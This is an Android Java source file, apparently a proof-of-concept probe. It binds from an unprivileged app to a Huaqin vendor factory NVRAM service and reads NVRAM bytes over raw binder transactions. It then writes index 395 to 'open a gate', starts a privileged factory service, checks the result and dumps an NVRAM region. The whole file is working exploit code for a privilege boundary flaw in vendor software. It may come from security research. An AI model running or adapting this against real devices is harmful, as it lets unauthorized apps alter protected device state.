package com.probe.nvaidl;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

public class MainActivity extends Activity {
    static final String TAG = "nvprobe";
    static final String PKG = "com.huaqin.NvService";
    static final String CLS = "com.huaqin.NvService.FactoryNvramService";
    static final String DESC = "aidl.NvAidlService";
    static final int DEPTH = 0x18b;

    static IBinder svc;

    static void log(String s) {
        Log.i(TAG, s);
        System.out.println("[NVP] " + s);
    }

    static String readHex(int start, int end) {
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(DESC);
            data.writeInt(start);
            data.writeInt(end);
            svc.transact(2, data, reply, 0);
            int ex = reply.readInt();
            String r = (ex == 0) ? reply.readString() : null;
            data.recycle();
            reply.recycle();
            return r;
        } catch (Throwable t) {
            return null;
        }
    }

    static void write(int idx, int val) {
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(DESC);
            data.writeInt(idx);
            data.writeInt(val);
            svc.transact(3, data, reply, 0);
            int ex = reply.readInt();
            int r = (ex == 0) ? reply.readInt() : -999;
            data.recycle();
            reply.recycle();
            log("W idx=" + idx + " val=" + val + " ex=" + ex + " ret=" + r);
        } catch (Throwable t) {
            log("W EX: " + t);
        }
    }

    static int byteAt(int i) {
        String h = readHex(i, i + 1);
        if (h == null || h.length() < 2) return -1;
        return Integer.parseInt(h.substring(0, 2), 16);
    }

    @Override
    protected void onCreate(Bundle bnd) {
        super.onCreate(bnd);
        log("onCreate uid=" + android.os.Process.myUid());
        try {
            Intent it = new Intent();
            it.setComponent(new ComponentName(PKG, CLS));
            it.setAction("com.huaqin.action.factoryNv");
            ServiceConnection conn = new ServiceConnection() {
                public void onServiceConnected(ComponentName n, IBinder bb) {
                    svc = bb;
                    new Thread() {
                        public void run() {
                            try {
                                log("desc=" + svc.getInterfaceDescriptor());
                                int v0 = byteAt(DEPTH);
                                log("GATE idx=" + DEPTH + " before=0x" + Integer.toHexString(v0)
                                        + " ('" + (char) v0 + "')");

                                log("OPEN gate: write idx=395 -> '1'");
                                write(DEPTH, 1);
                                log("  gate now=0x" + Integer.toHexString(byteAt(DEPTH)));

                                log("NOW starting FactorySetService (unprivileged startService)");
                                Intent s = new Intent();
                                s.setComponent(new ComponentName(
                                        "com.huaqin.factoryservice",
                                        "com.huaqin.factoryservice.FactorySetService"));
                                s.setAction("com.huaqin.action.factoryset");
                                try {
                                    startService(s);
                                    log("  startService returned OK");
                                } catch (Throwable t) {
                                    log("  startService EX: " + t);
                                }
                                Thread.sleep(3000);

                                int v2 = byteAt(DEPTH);
                                log("GATE idx=" + DEPTH + " afterService=0x" + Integer.toHexString(v2)
                                        + " ('" + (char) v2 + "')");
                                log("  (service may auto-rewrite to '2' via writeNVItem)");

                                // safety: if gate still '1', restore to '2'
                                if (v2 == 0x31) {
                                    log("SAFETY: gate still 1, forcing back to '2'");
                                    write(DEPTH, 2);
                                    log("  gate now=0x" + Integer.toHexString(byteAt(DEPTH)));
                                }
                                log("REGION 384..416 = " + readHex(384, 416));
                            } catch (Throwable t) {
                                log("EX: " + t);
                            }
                        }
                    }.start();
                }
                public void onServiceDisconnected(ComponentName n) { log("disc"); }
            };
            log("bind=" + bindService(it, conn, Context.BIND_AUTO_CREATE));
        } catch (Throwable t) {
            log("EX: " + t);
        }
    }
}